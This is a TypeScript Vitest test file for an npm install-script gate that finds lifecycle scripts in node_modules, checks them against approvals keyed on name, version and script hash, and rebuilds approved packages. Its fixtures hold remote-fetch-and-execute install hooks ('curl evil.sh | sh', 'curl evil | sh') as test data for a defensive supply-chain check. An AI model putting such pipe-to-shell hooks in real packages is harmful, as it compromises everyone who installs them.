import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  collectLifecycleScripts,
  findNodeModulesRoots,
  lockfileFingerprint,
  rebuildPackages,
  scriptHashFor,
  unapprovedScripts,
} from "./installGate";

let tmp: string | undefined;
function worktree(): string {
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), "radulf-gate-"));
  return tmp;
}
afterEach(() => {
  if (tmp) fs.rmSync(tmp, { recursive: true, force: true });
  tmp = undefined;
});

function addPackage(
  root: string,
  name: string,
  version: string,
  scripts: Record<string, string> = {},
  nmDir = "node_modules",
) {
  const dir = path.join(root, nmDir, name);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(
    path.join(dir, "package.json"),
    JSON.stringify({ name, version, scripts }),
  );
  return dir;
}

describe("install-script gate (spec 14 1h)", () => {
  it("enumerates lifecycle scripts structurally from the resolved tree", async () => {
    const wt = worktree();
    addPackage(wt, "clean-pkg", "1.0.0", { test: "vitest" });
    addPackage(wt, "native-pkg", "2.1.0", { postinstall: "node-gyp rebuild" });
    addPackage(wt, "@scope/hooked", "0.3.0", { preinstall: "curl evil.sh | sh" });

    const found = await collectLifecycleScripts(wt);
    expect(found.map((p) => p.name).sort()).toEqual(["@scope/hooked", "native-pkg"]);
    const native = found.find((p) => p.name === "native-pkg")!;
    // The verbatim script body travels to the approving human.
    expect(native.scripts.postinstall).toBe("node-gyp rebuild");
    expect(native.version).toBe("2.1.0");
  });

  it("finds nested and monorepo node_modules (CLI flags cannot dodge the scan)", async () => {
    const wt = worktree();
    // `npm install --ignore-scripts=false` changes how the install RAN, not
    // what is on disk — the scan reads the resolved tree either way.
    addPackage(wt, "top", "1.0.0", { install: "make" });
    const topDir = path.join(wt, "node_modules", "top");
    addPackage(topDir, "nested", "0.1.0", { postinstall: "./build.sh" });
    addPackage(path.join(wt, "packages", "app"), "deep", "3.0.0", { prepare: "husky" });

    const names = (await collectLifecycleScripts(wt)).map((p) => p.name).sort();
    expect(names).toEqual(["deep", "nested", "top"]);
    expect(findNodeModulesRoots(wt).length).toBe(2);
  });

  it("diffs against approvals keyed on name + version + scriptHash", async () => {
    const wt = worktree();
    addPackage(wt, "native-pkg", "2.1.0", { postinstall: "node-gyp rebuild" });
    const [pkg] = await collectLifecycleScripts(wt);

    // Unapproved → fires.
    expect(unapprovedScripts([pkg], [])).toHaveLength(1);
    // Approved exact triple → passes.
    const approval = { name: pkg.name, version: pkg.version, scriptHash: pkg.scriptHash };
    expect(unapprovedScripts([pkg], [approval])).toHaveLength(0);
    // Version bump re-fires.
    expect(
      unapprovedScripts([{ ...pkg, version: "2.2.0" }], [approval]),
    ).toHaveLength(1);
    // Edited script body re-fires (scriptHash mismatch).
    const edited = { ...pkg, scriptHash: scriptHashFor({ postinstall: "curl evil | sh" }) };
    expect(unapprovedScripts([edited], [approval])).toHaveLength(1);
  });

  it("hashes the script set stably and order-independently", () => {
    expect(scriptHashFor({ postinstall: "a", preinstall: "b" })).toBe(
      scriptHashFor({ preinstall: "b", postinstall: "a" }),
    );
    expect(scriptHashFor({ postinstall: "a" })).not.toBe(scriptHashFor({ postinstall: "b" }));
  });

  it("changes the lockfile fingerprint when an install lands (incl. --no-save)", () => {
    const wt = worktree();
    fs.writeFileSync(path.join(wt, "package-lock.json"), "{}");
    const before = lockfileFingerprint(wt);
    // A --no-save install touches node_modules/.package-lock.json only.
    fs.mkdirSync(path.join(wt, "node_modules"), { recursive: true });
    fs.writeFileSync(path.join(wt, "node_modules", ".package-lock.json"), '{"x":1}');
    const after = lockfileFingerprint(wt);
    expect(after).not.toBe(before);
    expect(lockfileFingerprint(wt)).toBe(after);
  });

  it("rebuilds approved packages one at a time and stops on failure", async () => {
    const calls: string[][] = [];
    const result = await rebuildPackages("/wt", ["a", "b"], async (args) => {
      calls.push(args);
      return { ok: true, out: `${args[1]} rebuilt` };
    });
    expect(result).toEqual({ ok: true, out: "a rebuilt\nb rebuilt" });
    expect(calls).toEqual([
      ["rebuild", "a"],
      ["rebuild", "b"],
    ]);

    const failed = await rebuildPackages("/wt", ["a", "b"], async (args) =>
      args[1] === "a" ? { ok: false, out: "gyp ERR!" } : { ok: true, out: "" },
    );
    expect(failed.ok).toBe(false);
    expect(failed.out).toContain("gyp ERR!");
  });

  it("surfaces a timed-out rebuild as ok:false naming the timeout", async () => {
    const timedOut = await rebuildPackages("/wt", ["hangs"], async () => ({
      ok: false,
      out: "npm rebuild hangs timed out after 300000ms",
    }));
    expect(timedOut.ok).toBe(false);
    expect(timedOut.out).toContain("timed out");
  });
});
